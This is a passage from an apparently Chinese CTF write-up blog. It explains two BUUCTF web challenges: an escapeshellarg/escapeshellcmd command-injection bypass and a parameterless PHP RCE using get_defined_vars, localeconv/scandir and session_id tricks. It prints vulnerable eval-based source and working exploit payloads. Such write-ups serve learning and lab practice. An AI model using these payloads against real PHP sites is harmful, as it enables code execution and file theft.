class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.确保用户只传递一个参数给命令。2用户不能指定更多的参数。3.用户不能执行不同的命令。</span><br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.确保用户只执行一个命令。2.用户可以指定不限数量的参数。3.用户不能执行不同的命令。 这两个函数一起使用会存在漏洞。</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;    <span class="hljs-comment">//-T5 : 可以加快或者减慢扫描速度，有六个级别，级别越高速度越快，也越容易被WAF或者IDS发现。-sT：使用TCP Syn扫描最常用的端口，会完整的执行完TCP的三次握手，隐蔽性不强。-Pn：有时候防火墙会禁止ping请求.-PN命令告诉Nmap不用ping远程主机。–host-timeout ：限制每个 IP 地址的扫描时间(单位为秒).-F：要求扫描时(包挺ping扫描)使用小的IP包分段。</span><br></code></pre></td></tr></table></figure><p>看了其它师傅们的wp，问题主要出在连续使用<code>escapeshellarg</code> 和 <code>escapeshellcmd</code>上：同时使用会导致绕过过滤执行命令：</p><p>以下内容参考了X1r0z师傅的博客：</p><p><code>https://exp10it.cn/2022/08/buuctf-web-writeup-3/#buuctf-2018online-tool</code></p><blockquote><p>escapeshellarg() 会在单引号之前加上 <code>\</code>, 并在被转义的单引号两边和整个字符串两边加上单引号</p><p>escapeshellcmd() 会在所有的 <code>\</code> 前加上 <code>\</code>, 形成 <code>\\</code>, 并在<strong>不成对</strong>的单引号前加 <code>\</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">123</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-comment"># 正常效果</span><br>    <br><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;\&#x27; # 最后一个引号不成对, 被转义</span><br><span class="hljs-string"></span><br><span class="hljs-string">123&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # 所有引号成对, 不转义</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;123&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # 所有引号成对, 不转义</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_43952190/article/details/<span class="hljs-number">105846175</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/shinygod/article/details/<span class="hljs-number">123207785</span>?utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>~default~baidujs_baidulandingword~default-<span class="hljs-number">0</span>-<span class="hljs-number">123207785</span>-blog-<span class="hljs-number">105846175</span>.<span class="hljs-number">235</span>^v38^pc_relevant_yljh&amp;spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4242</span>.<span class="hljs-number">1</span>&amp;utm_relevant_index=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">https</span>://exp10it.cn/<span class="hljs-number">2022</span>/<span class="hljs-number">08</span>/buuctf-web-writeup-<span class="hljs-number">3</span>/#buuctf-<span class="hljs-number">2018</span>online-tool<br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_44077544/article/details/<span class="hljs-number">102835099</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><img src="/img/tw1.png" alt="tw1"></p><p>源码没啥信息，直接dirsearch扫看看吧：</p><p><code>python dirsearch.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn --delay 3 -t 30</code></p><p><img src="/img/tw2.png" alt="tw2"></p><p>扫出来很多.git文件。。应该是git泄露了，用GitHack弄它：</p><p><code>python GitHack.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn/.git/</code></p><p><img src="/img/tw3.png" alt="tw3"></p><p>现在windows下看看，不行再用Kali做。发现有个Index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//正则匹配，过滤了点伪协议要用的东西(比如data://啥的，前面加那个\是转义用的)，没触发则进行下一步判断。/i模式不区分大小写</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//匹配a-z，逗号和_，\(和\)分别是转义后的左括号和右括号。(?R)?这玩意儿查了一下说是递归模式?正则过滤后的结果必须强等于分号</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//又一次过滤了一大堆东西                // echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP">正则匹配中(?R)?递归模式的解释：<br>    ?R是引用当前表达式((/[a-z,_]+((?R)?)/))，形成递归调用。<br>    ?表示递归当前表达式<span class="hljs-number">0</span>次或<span class="hljs-number">1</span>次。若是(?R)*则表示递归当前表达式<span class="hljs-number">0</span>次或多次，例如它可以匹配<span class="hljs-title function_ invoke__">a</span>(<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-title function_ invoke__">c</span>()<span class="hljs-title function_ invoke__">d</span>()))，举个栗子：<br>    <br>    <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">//echo  hello</span><br> <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)*\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//echo  goodbye</span><br><br><span class="hljs-comment">//注意$a的格式，如果是很标准的一个括号套着一个括号：a(b(c()))，ok,用这两种都没问题，但你如果有的地方套了两个：a(b()c())。那第一种就不行了，只能用第二种。我个人理解就是?一个套着一个这样搞，但是*允许一个套多个。感觉这就是题目说的套娃？一般RCE都要给执行命令的函数传参，比如eval(system(&#x27;ls&#x27;));。匹配完了会多个&#x27;&#x27;出来。</span><br>    <br></code></pre></td></tr></table></figure><p>经过这种正则匹配后能过滤的基本都过滤了，去网上查了wp原来这是一种叫<code>无参数RCE</code>的题型(第一次见)。下面的内容参考了这两位师傅的文章，感谢!</p><p><code>https://blog.csdn.net/Manuffer/article/details/120738755</code></p><p><code>https://blog.csdn.net/weixin_46330722</code></p><p>无参数RCE一般有三种解法：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.利用<span class="hljs-built_in">getallheaders</span>()函数。<br><span class="hljs-number">2</span>.利用<span class="hljs-built_in">get_defined_vars</span>()函数。<br><span class="hljs-number">3</span>.利用session_id帮助命令执行。<br></code></pre></td></tr></table></figure><p>拿<code>getallheaders()</code>来说，这东西会以数组形式返回所有HTTP头信息，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<span class="hljs-comment">//数组形式所以我用了var_dump</span><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/tw4.png" alt="tw4"></p><p>可以看到以数组的形式返回了HTTP数据包的头和对应信息，有意思的一点是这东西是倒着出来的。</p><p>数组形式肯定没法用，想给<code>eval</code>啥的传参肯定要是个字符串。可以利用<code>implode</code>函数把数组变成字符串，看下GPT对这个函数的解释：</p><p><img src="/img/tw5.png" alt="tw5"></p><p>不过这个$glue并不是必须的，默认没东西直接串起来，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw6.png" alt="tw6"></p><p>现在字符串也得到了，我么可以在传http包的时候给数据包底下加个头比如：<code>renyi:system(&#39;whoami&#39;);//</code>达到执行任意命令的目的(后面跟着注释符号，把其他的注释掉了)。</p><p>不过着这种方法我没成功。。。</p><p><code>get_defined_vars()</code>：返回所有已定义所组成的数组，不过这个和<code>getallheaders()</code>不一样，它返回的是多维数组，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw7.png" alt="tw7"></p><p>可以看到这东西会把GET传入的参数显示在第一位</p><p><img src="/img/tw8.png" alt="tw8"></p><p>GET传入的参数可控，那我们肯定希望在这个多维数组中取出我们想要的东西：利用<code>current</code>函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通果这个函数将其取出来<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw9.png" alt="tw9"></p><p><img src="/img/tw10.png" alt="tw10"></p><p>传两个参数也可以↑</p><p>假如我们要传入的恶意代码放在GET后面(传的第一个参数为了绕过一些特定参数的检测，第二个参数放恶意代码)，那么如何通过<code>current(get_defined_vars())</code>把他取出来？</p><p>可以利用<code>end</code>函数(返回数组最后一个单元的值)，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/tw11.png" alt="tw11"></p><p>绕了个小小的圈子，现在写个简单的东西看看为啥要通过第二种方法传两个参数达到<code>RCE</code>的效果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123; <br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><br><br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload:<code>?exp=eval(end(current(get_defined_vars())));&amp;c=system(phpinfo());</code></p><p><img src="/img/tw12.png" alt="tw12"></p><p>可以看到成功执行了<code>system(phpinfo())</code>。解释下为什么这么写：<code>eval(end(current(get_defined_vars())));</code>这东西为了返回我们get传过去的最后一个参数的值。我一开始没加eval想着外面已经有个eval了(当时人晕了，哈哈)，里面这个eval是为了执行这些套娃函数把恶意代码翻出来，外面的eval是执行恶意代码用的，一来一回就相当于<code>eval(system(phpinfo()))</code>了。而且这第二个参数可以随便构造，反正它只检测<code>exp</code>。</p><p>第三种方法通过<code>session_id</code>执行恶意代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//作用是获取当前会话的ID,也就是cookie中的phpsession，这里要注意的一点是，phpsession中只允许出现 a-z A-Z 0-9 , - 等字符，所以不能直接插入恶意代码，可以先将其16进制编码后再插入。</span><br>测试代码：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//参考了novic4师傅的文章</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = implode(getallheaders());<br><span class="hljs-regexp">//</span>ech<br><span class="hljs-regexp">//</span>var_dump(localeconv());<br><span class="hljs-regexp">//</span>var_dump(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-regexp">//</span><span class="hljs-variable">$viper</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viper&#x27;</span>];<br><span class="hljs-regexp">//</span>@eval(<span class="hljs-variable">$viper</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/tw13.png" alt="tw13"></p><p>注意这个hex2bin，他是字符串转字符串而不是数字转数字。</p><p>现在思路就比较清晰了：<code>phpsession</code>头的值我们可以控制，先通过<code>eval(hex2bin(session_id(session_start())));</code>把我们需要的恶意代码翻出来，然后把它传给exp参数就行了(注意要把恶意代码转成十六进制！)：</p><p><code>因为我到现在还没整明白怎么用burpsuite抓本地包，所以下面的图参考了novic4师傅的图，再次感谢！</code></p><p><img src="/img/tw14.png" alt="tw14"></p><p>现在回到这个套娃题，已知过滤了<code>et</code>，<code>hex</code>等，似乎上面三种方法都用不了了。。。</p><p>看了师傅们的wp，第一个payload这么写：</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><p>先看看这个<code>localeconv()</code>返回了什么东西：</p><p><img src="/img/tw17.png" alt="tw17"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/tw15.png" alt="tw15"></p><p>第一项返回了我们想要的<code>.</code>。再利用<code>current</code>返回一维数组第一项的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw16.png" alt="tw16"></p><p>注意这里和前面那个<code>get_defined_vars</code>区分开，人家返回的是多维数组，现在我们只返回了一个数组，所以<code>current</code>后只有一个点。</p><p><code>scandir(&#39;.&#39;)</code>这东西会以数组形式返回当前目录下的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw18.png" alt="tw18"></p><p>综上，我们先通过<code>/?exp=var_dump(scandir(current(localeconv())));</code>看看当前目录下的文件都有啥(var_dump也能用<code>print_r</code>等代替：</p><p><img src="/img/tw19.png" alt="tw19"></p><p>可以看到倒数第二个文件就是flag.php了，构造payload:</p><p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><p>因为<code>flag.php</code>在倒数第二个，所以先<code>array_reverse</code>把它转成正数第二个，然后<code>next</code>将指针向下移动直接提取第二个(前面的<code>current</code>将指针放在首位)。</p><p><img src="/img/tw20.png" alt="tw20"></p><p>也可以用<code>highlight_file()</code>函数替换，他俩差不多。</p><p>还有一种情况，比如这个flag.php的位置不特殊：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">如果flag.php的位置不特殊，可以使用<span class="hljs-title function_ invoke__">array_rand</span>()和<span class="hljs-title function_ invoke__">array_flip</span>()(<span class="hljs-title function_ invoke__">array_rand</span>()返回的是键名所以必须搭配<span class="hljs-title function_ invoke__">array_flip</span>()来交换键名、键值来获得键值，函数作用上面有写到)来随机刷新显示的内容，刷几次就出来了，所以这种情况payload：<br> ?exp=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><span class="hljs-title function_ invoke__">array_rand</span>()这东西会返回随机一个键名，<span class="hljs-title function_ invoke__">array_flip</span>()用于交换数组中的键和值，这两个组合一下就会获得随机的一个键值。因为这东西完全随机的，所以多刷新几次才可能会出现flag！    <br></code></pre></td></tr></table></figure><p>第二种方法使用session_id：</p><p>不过正则匹配过滤了<code>hex</code>，前面的<code>eval(hex2bin(session_id(session_start())));</code>肯定没法用了，不过师傅的博客里说<code>PHPSESSIID</code>这东西可以直接给他赋值<code>flag.php</code>：</p><p>payload:<code>?exp=show_source(session_id(session_start()));</code></p><p>并加个<code>cookie</code>头：<code>cookie:PHPSESSID=flag.php</code></p><p><img src="/img/tw21.png" alt="tw21"></p><p>以上内容参考了这些师傅们的文章，感谢！：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span 